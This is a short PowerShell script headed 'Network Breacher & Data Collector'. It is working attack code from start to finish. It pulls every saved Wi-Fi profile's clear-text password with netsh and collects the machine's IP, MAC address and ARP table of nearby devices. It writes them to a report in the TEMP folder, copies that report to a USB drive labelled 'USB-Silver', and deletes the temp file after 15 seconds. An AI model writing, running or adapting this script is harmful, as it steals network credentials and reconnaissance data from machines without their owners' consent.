# ==========================================
# Network Breacher & Data Collector
# ==========================================

# 1. Extract WLAN profiles and clear-text passwords
$wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $n = $_.Matches.Groups[1].Value.Trim()
    $res = (netsh wlan show profile name="$n" key=clear)
    $p = ($res | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() })
    if ($p) { "WLAN: $n | PW: $p" }
}

# 2. Get IP and MAC address of the active network adapter
$ipConfig = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -like '*Wi-Fi*' -or $_.InterfaceAlias -like '*Ethernet*'} | Select-Object -First 1
$ip = $ipConfig.IPAddress
$mac = (Get-NetAdapter | Where-Object {$_.InterfaceIndex -eq $ipConfig.InterfaceIndex}).MacAddress

# 3. Retrieve ARP table (connected devices on the local network)
$arp = arp -a | Out-String

# 4. Generate report file in the TEMP folder and open it in Notepad
$path = "$env:TEMP\Networkstats.txt"
"=== SYSTEM INFO ===`nIP: $ip`nMAC: $mac`n`n=== WLAN PROFILES & PASSWORDS ===`n" + ($wifi -join "`n") + "`n`n=== FOUND DEVICES (ARP) ===`n$arp" > $path
notepad $path

# 5. Check for the USB drive labeled "USB-Silver" and copy the report there
$usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq "USB-Silver" }
if ($usb) {
    Copy-Item $path "$($usb.DriveLetter):\" -Force
}

# 6. Cleanup and exit after 15 seconds
Start-Sleep -s 15
Remove-Item $path -ErrorAction SilentlyContinue
exit